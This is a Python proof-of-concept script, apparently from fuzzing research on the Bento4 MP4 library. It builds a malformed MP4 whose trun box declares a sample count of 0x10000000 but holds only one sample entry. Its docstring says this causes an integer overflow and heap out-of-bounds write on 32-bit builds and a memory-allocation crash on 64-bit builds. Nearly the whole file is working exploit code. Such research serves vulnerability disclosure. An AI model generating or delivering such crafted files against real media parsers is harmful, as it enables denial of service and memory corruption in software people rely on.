#!/usr/bin/env python3
"""
PoC generator for VULN 002:
Unchecked trun sample_count causes integer overflow in EnsureCapacity
-> heap OOB write in AP4_TrunAtom constructor loop (32-bit)
On 64-bit: std::bad_alloc from new(4GB) -> DoS crash.
"""
import struct
import os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4FragmentSampleTable_cpp"
OUT_FILE = os.path.join(POC_DIR, "vuln_002.mp4")


def box(box_type, payload=b""):
    """Build a box: 4-byte BE size + 4-byte type + payload."""
    if isinstance(box_type, str):
        box_type = box_type.encode("ascii")
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def fullbox(box_type, version=0, flags=0, payload=b""):
    """Build a full box (version + flags prefix)."""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(box_type, vf + payload)


def make_ftyp():
    payload = b"mp42"                    # major brand
    payload += struct.pack(">I", 0)     # minor version
    payload += b"mp42"                   # compatible brands
    return box("ftyp", payload)


def make_mvhd():
    # version=0 fullbox
    payload = struct.pack(">I", 0)       # creation_time
    payload += struct.pack(">I", 0)      # modification_time
    payload += struct.pack(">I", 1000)   # timescale
    payload += struct.pack(">I", 0)      # duration
    payload += struct.pack(">I", 0x00010000)  # rate
    payload += struct.pack(">H", 0x0100)      # volume
    payload += b"\x00" * 10              # reserved
    # matrix (standard identity)
    payload += struct.pack(">9i",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b"\x00" * 24             # pre_defined
    payload += struct.pack(">I", 2)     # next_track_id
    return fullbox("mvhd", version=0, flags=0, payload=payload)


def make_tkhd():
    # version=0, flags=0x000003 (track enabled + in movie)
    payload = struct.pack(">I", 0)      # creation_time
    payload += struct.pack(">I", 0)     # modification_time
    payload += struct.pack(">I", 1)     # track_id
    payload += struct.pack(">I", 0)     # reserved
    payload += struct.pack(">I", 0)     # duration
    payload += b"\x00" * 8             # reserved
    payload += struct.pack(">h", 0)    # layer
    payload += struct.pack(">h", 0)    # alternate_group
    payload += struct.pack(">H", 0x0100)  # volume
    payload += struct.pack(">H", 0)    # reserved
    # matrix
    payload += struct.pack(">9i",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">I", 0)    # width
    payload += struct.pack(">I", 0)    # height
    return fullbox("tkhd", version=0, flags=0x3, payload=payload)


def make_mdhd():
    payload = struct.pack(">I", 0)      # creation_time
    payload += struct.pack(">I", 0)     # modification_time
    payload += struct.pack(">I", 44100) # timescale
    payload += struct.pack(">I", 0)     # duration
    payload += struct.pack(">H", 0x55c4)  # language (und)
    payload += struct.pack(">H", 0)     # pre_defined
    return fullbox("mdhd", version=0, flags=0, payload=payload)


def make_hdlr():
    payload = struct.pack(">I", 0)      # pre_defined
    payload += b"soun"                  # handler_type
    payload += b"\x00" * 12            # reserved
    payload += b"\x00"                  # name (null terminated)
    return fullbox("hdlr", version=0, flags=0, payload=payload)


def make_smhd():
    payload = struct.pack(">H", 0)      # balance
    payload += struct.pack(">H", 0)     # reserved
    return fullbox("smhd", version=0, flags=0, payload=payload)


def make_dinf():
    # url entry: size=12, type='url ', version_flags=0x000001 (self-contained)
    url_entry = struct.pack(">I", 12) + b"url " + struct.pack(">I", 0x000001)
    # dref: version/flags=0, entry_count=1, then url_entry
    dref_payload = struct.pack(">I", 1) + url_entry
    dref = fullbox("dref", version=0, flags=0, payload=dref_payload)
    return box("dinf", dref)


def make_stbl():
    stsd = fullbox("stsd", version=0, flags=0, payload=struct.pack(">I", 0))
    stts = fullbox("stts", version=0, flags=0, payload=struct.pack(">I", 0))
    stsc = fullbox("stsc", version=0, flags=0, payload=struct.pack(">I", 0))
    stsz = fullbox("stsz", version=0, flags=0,
                   payload=struct.pack(">II", 0, 0))  # sample_size=0, count=0
    stco = fullbox("stco", version=0, flags=0, payload=struct.pack(">I", 0))
    return box("stbl", stsd + stts + stsc + stsz + stco)


def make_minf():
    smhd = make_smhd()
    dinf = make_dinf()
    stbl = make_stbl()
    return box("minf", smhd + dinf + stbl)


def make_mdia():
    mdhd = make_mdhd()
    hdlr = make_hdlr()
    minf = make_minf()
    return box("mdia", mdhd + hdlr + minf)


def make_trak():
    tkhd = make_tkhd()
    mdia = make_mdia()
    return box("trak", tkhd + mdia)


def make_moov():
    mvhd = make_mvhd()
    trak = make_trak()
    return box("moov", mvhd + trak)


def make_mfhd():
    payload = struct.pack(">I", 1)      # sequence_number=1
    return fullbox("mfhd", version=0, flags=0, payload=payload)


def make_tfhd():
    # flags=0 means no optional fields; track_id=1
    payload = struct.pack(">I", 1)      # track_id
    return fullbox("tfhd", version=0, flags=0, payload=payload)


def make_trun():
    # flags = AP4_TRUN_FLAG_DATA_OFFSET(0x0001) | AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT(0x0200)
    # = 0x0201
    # sample_count = 0x10000000 (huge, triggers overflow/bad_alloc)
    # data_offset = 8 (present because bit 0 set)
    # Only ONE actual sample_size entry (4 bytes) despite sample_count=0x10000000
    SAMPLE_COUNT = 0x10000000
    FLAGS = 0x0201
    payload = struct.pack(">I", SAMPLE_COUNT)   # sample_count
    payload += struct.pack(">i", 8)             # data_offset (signed 32-bit)
    # Only one actual sample entry (sample_size=1000), rest are missing
    payload += struct.pack(">I", 1000)          # sample_size entry (1 entry)
    return fullbox("trun", version=0, flags=FLAGS, payload=payload)


def make_traf():
    tfhd = make_tfhd()
    trun = make_trun()
    return box("traf", tfhd + trun)


def make_moof():
    mfhd = make_mfhd()
    traf = make_traf()
    return box("moof", mfhd + traf)


def make_mdat():
    # Minimal media data - just 8 bytes of zeros
    return box("mdat", b"\x00" * 8)


def generate():
    ftyp = make_ftyp()
    moov = make_moov()
    moof = make_moof()
    mdat = make_mdat()

    mp4 = ftyp + moov + moof + mdat

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    print(f"[+] trun sample_count=0x10000000, flags=0x0201 (data_offset + sample_size_present)")
    print(f"[+] Only 1 actual sample entry provided; triggers integer overflow / bad_alloc")


if __name__ == "__main__":
    generate()
